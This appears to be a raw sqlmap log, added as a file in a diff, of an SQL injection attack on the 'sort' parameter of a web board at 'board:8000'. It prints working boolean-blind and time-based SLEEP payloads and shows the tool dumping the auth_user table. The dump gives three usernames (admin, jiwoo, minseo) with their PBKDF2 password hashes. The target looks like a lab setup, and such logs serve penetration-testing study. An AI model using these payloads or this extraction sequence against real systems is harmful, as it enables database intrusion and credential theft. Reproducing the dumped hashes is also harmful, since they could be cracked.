@@ -1,0 +1,70 @@
+[*] starting @ 04:34:55 /2026-10-10/
+
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[04:34:55] [INFO] testing connection to the target URL
+[04:34:55] [INFO] checking if the target is protected by some kind of WAF/IPS
+[04:34:55] [INFO] testing if the target URL content is stable
+[04:34:55] [INFO] target URL content is stable
+[04:34:55] [INFO] testing if URI parameter '#1*' is dynamic
+[04:34:56] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[04:34:56] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be SQL injectable (possible DBMS: 'MySQL')
+[04:34:56] [INFO] testing for SQL injection on URI parameter '#1*'
+[04:34:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[04:34:56] [WARNING] reflective value(s) found and filtering out
+[04:35:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[04:35:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[04:35:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[04:35:22] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --code=200)
+[04:35:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[04:35:32] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[04:35:32] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 323 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: http://board:8000/?sort=posts_post.id) AND 3707=(SELECT (CASE WHEN (3707=3707) THEN 3707 ELSE (SELECT 8658 UNION SELECT 6500) END))-- -
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://board:8000/?sort=posts_post.id) AND (SELECT 9127 FROM (SELECT(!SLEEP(5)))WBYH)-- GJIg
+---
+[04:35:34] [INFO] the back-end DBMS is MySQL
+[04:35:34] [INFO] target renders 3 rows that a single response could carry data in. You can try switch '--multi-bit' to read several characters per request instead of one bit. Though it widens the result set with OR payloads, as '--risk=3' does
+back-end DBMS: MySQL >= 5.0.12
+[04:35:35] [INFO] fetching entries of column(s) 'password,username' for table 'auth_user' in database 'board'
+[04:35:35] [INFO] fetching number of column(s) 'password,username' entries for table 'auth_user' in database 'board'
+[04:35:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+
+[04:35:35] [INFO] retrieved: 3
+
+[04:35:36] [INFO] retrieved: pbkdf2_sha256$260000$NzjS44iZXo36rs43PeMe1a$GAGObvRNjv8oeVlJZjdQhjXkw5y2rjnEt5Pgtry3vLI=
+
+[04:36:17] [INFO] retrieved: admin
+
+[04:36:20] [INFO] retrieved: pbkdf2_sha256$260000$qlyC5jWXiy2xOOq62CRP7v$AN0icP51NM0zIkRBTb3HQKuXWtpz0faJwK+xWsPY8yc=
+
+[04:36:58] [INFO] retrieved: jiwoo
+
+[04:37:00] [INFO] retrieved: pbkdf2_sha256$260000$UNz69g527hJj0fXMo9rq7d$foxacxncYYEP2gnJdOpeSldynlbyrnlzU8mDp8/8DzM=
+
+[04:37:37] [INFO] retrieved: minseo
+Database: board
+Table: auth_user
+[3 entries]
++----------+------------------------------------------------------------------------------------------+
+| username | password                                                                                 |
++----------+------------------------------------------------------------------------------------------+
+| admin    | pbkdf2_sha256$260000$NzjS44iZXo36rs43PeMe1a$GAGObvRNjv8oeVlJZjdQhjXkw5y2rjnEt5Pgtry3vLI= |
+| jiwoo    | pbkdf2_sha256$260000$qlyC5jWXiy2xOOq62CRP7v$AN0icP51NM0zIkRBTb3HQKuXWtpz0faJwK+xWsPY8yc= |
+| minseo   | pbkdf2_sha256$260000$UNz69g527hJj0fXMo9rq7d$foxacxncYYEP2gnJdOpeSldynlbyrnlzU8mDp8/8DzM= |
++----------+------------------------------------------------------------------------------------------+
+
+[04:37:40] [INFO] table 'board.auth_user' dumped to CSV file '/root/.local/share/sqlmap/output/board/dump/board/auth_user.csv'
+[04:37:40] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1232 times
+[04:37:40] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/board'
+
+[*] ending @ 04:37:40 /2026-10-10/
+
